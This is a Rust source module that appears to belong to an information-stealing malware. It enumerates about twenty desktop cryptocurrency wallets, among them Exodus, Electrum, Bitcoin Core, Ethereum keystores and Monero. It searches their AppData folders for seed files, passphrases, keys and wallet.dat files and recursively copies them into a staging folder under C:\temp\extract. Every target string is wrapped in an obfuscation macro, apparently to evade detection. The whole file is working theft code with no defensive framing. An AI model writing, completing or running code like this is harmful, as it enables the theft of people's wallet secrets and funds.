use crate::sprotect;
use std::fs;
use std::path::PathBuf;

struct AppWallet {
    name: String,
    app_paths: Vec<PathBuf>,
    target_files: Vec<String>,
    target_directories: Vec<String>,
}

async fn get_appdata_paths() -> (PathBuf, PathBuf) {
    let home = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let roaming_path = PathBuf::from(&home).join(sprotect!("AppData")).join(sprotect!("Roaming"));
    let local_path = PathBuf::from(&home).join(sprotect!("AppData")).join(sprotect!("Local"));
    (roaming_path, local_path)
}

async fn get_app_wallets() -> Vec<AppWallet> {
    let (roaming_path, local_path) = get_appdata_paths().await;
    let mut wallets = Vec::new();

    wallets.push(AppWallet {
        name: sprotect!("Exodus").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Exodus"))],
        target_files: vec![
            sprotect!("exodus.wallet").to_string(),
            sprotect!("seed.seco").to_string(),
            sprotect!("passphrase.json").to_string(),
            sprotect!("*.wallet").to_string(),
        ],
        target_directories: vec![sprotect!("exodus.wallet").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Electrum").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Electrum"))],
        target_files: vec![
            sprotect!("*.dat").to_string(),
            sprotect!("wallets").to_string(),
            sprotect!("config").to_string(),
        ],
        target_directories: vec![
            sprotect!("wallets").to_string(),
            sprotect!("*").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("Atomic").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("atomic"))],
        target_files: vec![
            sprotect!("*.wallet").to_string(),
            sprotect!("*.log").to_string(),
            sprotect!("Local Storage").to_string(),
        ],
        target_directories: vec![
            sprotect!("Local Storage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("Coinomi").to_string(),
        app_paths: vec![
            local_path.join(sprotect!("Coinomi")),
            roaming_path.join(sprotect!("Coinomi")),
        ],
        target_files: vec![
            sprotect!("*.wallet").to_string(),
            sprotect!("*.db").to_string(),
            sprotect!("wallets").to_string(),
        ],
        target_directories: vec![sprotect!("wallets").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Guarda").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Guarda"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("Local Storage").to_string(),
        ],
        target_directories: vec![
            sprotect!("Local Storage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("BitcoinCore").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Bitcoin"))],
        target_files: vec![
            sprotect!("wallet.dat").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("bitcoin.conf").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Litecoin").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Litecoin"))],
        target_files: vec![
            sprotect!("wallet.dat").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("litecoin.conf").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Dash").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("DashCore"))],
        target_files: vec![
            sprotect!("wallet.dat").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("dash.conf").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Zcash").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Zcash"))],
        target_files: vec![
            sprotect!("wallet.dat").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("zcash.conf").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Ethereum").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Ethereum"))],
        target_files: vec![
            sprotect!("*.json").to_string(),
            sprotect!("keystore").to_string(),
            sprotect!("*.key").to_string(),
        ],
        target_directories: vec![
            sprotect!("keystore").to_string(),
            sprotect!("geth").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("Monero").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("bitmonero"))],
        target_files: vec![
            sprotect!("*.keys").to_string(),
            sprotect!("*.address.txt").to_string(),
            sprotect!("wallet").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Dogecoin").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("DogeCoin"))],
        target_files: vec![
            sprotect!("wallet.dat").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("dogecoin.conf").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Wasabi").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("WalletWasabi"))],
        target_files: vec![
            sprotect!("*.json").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("Wallets").to_string(),
        ],
        target_directories: vec![sprotect!("Wallets").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Jaxx").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Jaxx"))],
        target_files: vec![
            sprotect!("*.dat").to_string(),
            sprotect!("Local Storage").to_string(),
            sprotect!("*.log").to_string(),
        ],
        target_directories: vec![
            sprotect!("Local Storage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("MultiBit").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("MultiBit"))],
        target_files: vec![
            sprotect!("*.wallet").to_string(),
            sprotect!("*.key").to_string(),
            sprotect!("multibit.properties").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Armory").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Armory"))],
        target_files: vec![
            sprotect!("*.wallet").to_string(),
            sprotect!("armorylog.txt").to_string(),
            sprotect!("*.dat").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("TokenPocket").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("TokenPocket"))],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("Local Storage").to_string(),
        ],
        target_directories: vec![
            sprotect!("Local Storage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("MyCrypto").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("MyCrypto"))],
        target_files: vec![
            sprotect!("*.json").to_string(),
            sprotect!("Local Storage").to_string(),
            sprotect!("*.key").to_string(),
        ],
        target_directories: vec![
            sprotect!("Local Storage").to_string(),
            sprotect!("IndexedDB").to_string(),
        ],
    });

    wallets.push(AppWallet {
        name: sprotect!("Bytecoin").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("bytecoin"))],
        target_files: vec![
            sprotect!("*.wallet").to_string(),
            sprotect!("*.dat").to_string(),
            sprotect!("*.keys").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    wallets.push(AppWallet {
        name: sprotect!("Daedalus").to_string(),
        app_paths: vec![roaming_path.join(sprotect!("Daedalus"))],
        target_files: vec![
            sprotect!("*.json").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("secrets").to_string(),
        ],
        target_directories: vec![
            sprotect!("secrets").to_string(),
            sprotect!("*").to_string(),
        ],
    });

    wallets
}

async fn copy_file_if_exists(src: &PathBuf, dest_dir: &PathBuf) -> bool {
    if src.exists() && src.is_file() {
        if let Some(filename) = src.file_name() {
            let dest_path = dest_dir.join(filename);
            if let Some(parent) = dest_path.parent() {
                fs::create_dir_all(parent).ok();
            }
            fs::copy(src, dest_path).is_ok()
        } else {
            false
        }
    } else {
        false
    }
}

async fn copy_directory_if_exists(src: &PathBuf, dest: &PathBuf) -> bool {
    if src.exists() && src.is_dir() {
        copy_directory_recursive(src, dest)
    } else {
        false
    }
}

fn copy_directory_recursive(src: &PathBuf, dest: &PathBuf) -> bool {
    if fs::create_dir_all(dest).is_err() {
        return false;
    }

    if let Ok(entries) = fs::read_dir(src) {
        for entry in entries.flatten() {
            let src_path = entry.path();
            let dest_path = dest.join(entry.file_name());

            if src_path.is_dir() {
                copy_directory_recursive(&src_path, &dest_path);
            } else {
                fs::copy(&src_path, &dest_path).ok();
            }
        }
        true
    } else {
        false
    }
}

fn find_pattern_files(dir: &PathBuf, pattern: &str) -> Vec<PathBuf> {
    let mut files = Vec::new();
    if !dir.exists() {
        return files;
    }

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Some(filename) = path.file_name() {
                    if let Some(filename_str) = filename.to_str() {
                        if pattern_matches(filename_str, pattern) {
                            files.push(path);
                        }
                    }
                }
            } else if path.is_dir() {
                let mut subfiles = find_pattern_files(&path, pattern);
                files.append(&mut subfiles);
            }
        }
    }
    files
}

fn pattern_matches(filename: &str, pattern: &str) -> bool {
    if pattern == sprotect!("*") {
        return true;
    }
    if pattern.starts_with(sprotect!("*").as_str()) && pattern.ends_with(sprotect!("*").as_str()) {
        let middle = &pattern[1..pattern.len()-1];
        return filename.contains(middle);
    }
    if pattern.starts_with(sprotect!("*").as_str()) {
        let suffix = &pattern[1..];
        return filename.ends_with(suffix);
    }
    if pattern.ends_with(sprotect!("*").as_str()) {
        let prefix = &pattern[..pattern.len()-1];
        return filename.starts_with(prefix);
    }
    filename == pattern
}

pub async fn extract_app_wallets() -> Result<(), Box<dyn std::error::Error>> {
    let base_output = PathBuf::from(sprotect!("C:\\temp\\extract\\apps"));
    let wallets = get_app_wallets().await;

    for wallet in wallets {
        let wallet_output_dir = base_output.join(&wallet.name);
        fs::create_dir_all(&wallet_output_dir).ok();

        let mut found_data = false;

        for app_path in wallet.app_paths {
            if !app_path.exists() {
                continue;
            }

            for target_file in &wallet.target_files {
                let files = find_pattern_files(&app_path, target_file);
                for file in files {
                    if copy_file_if_exists(&file, &wallet_output_dir).await {
                        found_data = true;
                    }
                }
            }

            for target_dir in &wallet.target_directories {
                if target_dir == &sprotect!("*") {
                    if copy_directory_if_exists(&app_path, &wallet_output_dir.join(app_path.file_name().unwrap_or_default())).await {
                        found_data = true;
                    }
                } else {
                    let full_target_path = app_path.join(target_dir);
                    if copy_directory_if_exists(&full_target_path, &wallet_output_dir.join(target_dir)).await {
                        found_data = true;
                    }
                }
            }
        }

        if !found_data {
            fs::remove_dir_all(&wallet_output_dir).ok();
        }
    }

    Ok(())
}